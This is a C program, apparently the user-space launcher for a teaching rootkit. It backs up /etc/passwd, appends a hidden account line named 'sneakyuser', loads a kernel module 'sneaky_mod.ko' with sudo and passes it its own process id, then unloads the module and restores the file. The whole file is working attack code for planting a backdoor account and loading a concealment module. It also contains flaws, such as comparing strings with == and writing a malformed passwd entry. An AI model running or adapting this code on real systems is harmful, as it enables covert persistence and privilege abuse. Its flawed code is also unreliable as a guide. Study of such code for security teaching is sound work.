#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<sys/wait.h>

#define READ_BUFF 100

void CopyPwd(){
	FILE *src = fopen("/etc/passwd", "r");
	if(src == NULL) {
		fprintf(stderr, "Can't open source file!\n");
		exit(EXIT_FAILURE);
	}
	FILE *des = fopen("/tmp/passwd", "w");
	if(des == NULL) {
		fclose(src);
		fprintf(stderr, "Can't open destination file!\n");
		exit(EXIT_FAILURE);
	}
	int c = 0;
	char buf[READ_BUFF] = {0};
	while((c = fread(buf, sizeof(char), READ_BUFF, src)) > 0 ){
		fwrite(buf, sizeof(char), c, des);
	}
	if(fclose(src) != 0) {
		fprintf(stderr, "Fail to close source file!\n");
	  exit(EXIT_FAILURE);
	}
	if(fclose(des) != 0) {
		fprintf(stderr, "Fail to close denstination file!\n");
		exit(EXIT_FAILURE);
	}
}


void InsertLine() {
	FILE *des = fopen("/etc/passwd", "a");
	if(des == NULL) {
		fprintf(stderr, "Can't open destination file!\n");
		exit(EXIT_FAILURE);
	}
	char *str = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
	fputs(str, des);
	if(fclose(des) != 0) {
		fprintf(stderr, "Fail to close denstination file!\n");
		exit(EXIT_FAILURE);
	}
}

int DoLoop(FILE *f) {
	char c;
	while((c = fgetc(f)) != 'q'){}
	return 0;
}

void Restore(){
	FILE *src = fopen("/tmp/passwd", "r");
	if(src == NULL) {
		fprintf(stderr, "Can't open source file!\n");
		exit(EXIT_FAILURE);
	}
	FILE *des = fopen("/etc/passwd", "w");
	if(des == NULL) {
		fclose(src);
		fprintf(stderr, "Can't open destination file!\n");
		exit(EXIT_FAILURE);
	}
	int c = 0;
	char buf[READ_BUFF] = {0};
	while((c = fread(buf, sizeof(char), READ_BUFF, src)) > 0 ){
		fwrite(buf, sizeof(char), c, des);
	}
	if(fclose(src) != 0) {
		fprintf(stderr, "Fail to close source file!\n");
	  exit(EXIT_FAILURE);
	}
	if(fclose(des) != 0) {
		fprintf(stderr, "Fail to close denstination file!\n");
		exit(EXIT_FAILURE);
	}				
}	

void Execute(char * str) {
	pid_t pid, w;
	int status;
	pid = fork();
	if (pid < 0) {
		fprintf(stderr, "fork failed!\n");
		exit(EXIT_FAILURE);
	} else if (pid == 0){
		if (str == "load"){
			pid_t ppid = getppid();
			char process_id[128];
			snprintf(process_id, sizeof(process_id), "process_id=%d", ppid);
			printf("process_id = %s\n", process_id);
			char *args[] = {"sudo", "insmod", "sneaky_mod.ko", process_id,  NULL};
			if (execvp(args[0], args) == -1) {
				fprintf(stderr, "load failed!\n");
				exit(EXIT_FAILURE);
			}
		} else if (str == "unload") {
			char *args[] = {"sudo", "rmmod", "sneaky_mod.ko",  NULL};
			if (execvp(args[0], args) == -1) {
				fprintf(stderr, "unload failed!\n");
				exit(EXIT_FAILURE);
			}
		}
	} else {		
		do {
			w = waitpid(pid, &status, WUNTRACED | WCONTINUED);
			if (w == -1) {
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
			if (WIFEXITED(status)) {
				printf("exited, status=%d\n", WEXITSTATUS(status));
			} else if (WIFSIGNALED(status)) {
				printf("killed by signal %d\n", WTERMSIG(status));
			} else if (WIFSTOPPED(status)) {
				printf("stopped by signal %d\n", WSTOPSIG(status));
			} else if (WIFCONTINUED(status)) {
				printf("continued\n");
			}
		}	while (!WIFEXITED(status) && !WIFSIGNALED(status));
		if(str == "load") {
			DoLoop(stdin);
		} else if (str == "unload") {
			Restore();
		}
		exit(EXIT_SUCCESS);
	}
}


int main() {
	pid_t pid;
	pid = getpid();
	printf("sneaky_process pid = %d\n", pid);
	CopyPwd();
	InsertLine();
	Execute("load");
	Execute("unload");
}
